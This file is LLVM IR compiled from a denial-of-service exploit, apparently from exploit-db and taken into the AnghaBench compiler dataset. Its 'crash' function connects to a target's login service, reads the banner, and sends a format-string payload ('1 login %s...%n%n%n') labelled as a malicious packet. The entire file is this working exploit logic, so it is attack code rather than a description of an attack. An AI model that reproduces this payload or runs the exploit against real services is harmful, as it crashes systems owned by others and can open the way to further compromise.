; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_20952.c_crash.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_20952.c_crash.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@MAXRECVSIZE = common dso_local global i32 0, align 4
@__const.crash.poc = private unnamed_addr constant [51 x i8] c"1 login %s%s%s%s%s%s%s%s%s %s%s%s%s%s%s%s%s%n%n%n\0A\00", align 16
@.str = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@numbytes = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"recv\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"[+] Server -> %s\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"\0A[!] Sending malicious packet...\0A\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"\0A[+] Sent!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @crash(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca [51 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %11 = load i32, i32* @MAXRECVSIZE, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  %15 = bitcast [51 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([51 x i8], [51 x i8]* @__const.crash.poc, i32 0, i32 0), i64 51, i1 false)
  %16 = load i8*, i8** %3, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %8, align 8
  %18 = icmp eq %struct.hostent* %17, null
  br i1 %18, label %19, label %22

19:                                               ; preds = %2
  %20 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 @exit(i32 1) #5
  unreachable

22:                                               ; preds = %2
  %23 = load i32, i32* @AF_INET, align 4
  %24 = load i32, i32* @SOCK_STREAM, align 4
  %25 = call i32 @socket(i32 %23, i32 %24, i32 0)
  store i32 %25, i32* %5, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %30

27:                                               ; preds = %22
  %28 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %29 = call i32 @exit(i32 1) #5
  unreachable

30:                                               ; preds = %22
  %31 = load i32, i32* @AF_INET, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  store i32 %31, i32* %32, align 4
  %33 = load i32, i32* @PORT, align 4
  %34 = call i32 @htons(i32 %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %34, i32* %35, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %37 = load %struct.hostent*, %struct.hostent** %8, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 0
  %39 = load i64, i64* %38, align 8
  %40 = inttoptr i64 %39 to %struct.in_addr*
  %41 = bitcast %struct.in_addr* %36 to i8*
  %42 = bitcast %struct.in_addr* %40 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %41, i8* align 4 %42, i64 4, i1 false)
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %44 = call i32 @memset(i32* %43, i8 signext 0, i32 8)
  %45 = load i32, i32* %5, align 4
  %46 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %47 = call i32 @connect(i32 %45, %struct.sockaddr* %46, i32 4)
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %52

49:                                               ; preds = %30
  %50 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %51 = call i32 @exit(i32 1) #5
  unreachable

52:                                               ; preds = %30
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* @MAXRECVSIZE, align 4
  %55 = sub nsw i32 %54, 1
  %56 = call i32 @recv(i32 %53, i8* %14, i32 %55, i32 0)
  store i32 %56, i32* @numbytes, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %61

58:                                               ; preds = %52
  %59 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %60 = call i32 @exit(i32 1) #5
  unreachable

61:                                               ; preds = %52
  %62 = load i32, i32* @numbytes, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %14, i64 %63
  store i8 0, i8* %64, align 1
  %65 = load i32, i32* %4, align 4
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %78

67:                                               ; preds = %61
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i8* %14)
  %69 = call i32 @sleep(i32 1)
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  %71 = load i32, i32* %5, align 4
  %72 = getelementptr inbounds [51 x i8], [51 x i8]* %10, i64 0, i64 0
  %73 = getelementptr inbounds [51 x i8], [51 x i8]* %10, i64 0, i64 0
  %74 = call i32 @strlen(i8* %73)
  %75 = call i32 @send(i32 %71, i8* %72, i32 %74, i32 0)
  %76 = call i32 @sleep(i32 1)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0))
  br label %78

78:                                               ; preds = %67, %61
  %79 = load i32, i32* %5, align 4
  %80 = call i32 @close(i32 %79)
  %81 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %81)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #3

declare dso_local i32 @perror(i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32 @socket(i32, i32, i32) #3

declare dso_local i32 @htons(i32) #3

declare dso_local i32 @memset(i32*, i8 signext, i32) #3

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #3

declare dso_local i32 @recv(i32, i8*, i32, i32) #3

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @sleep(i32) #3

declare dso_local i32 @send(i32, i8*, i32, i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @close(i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
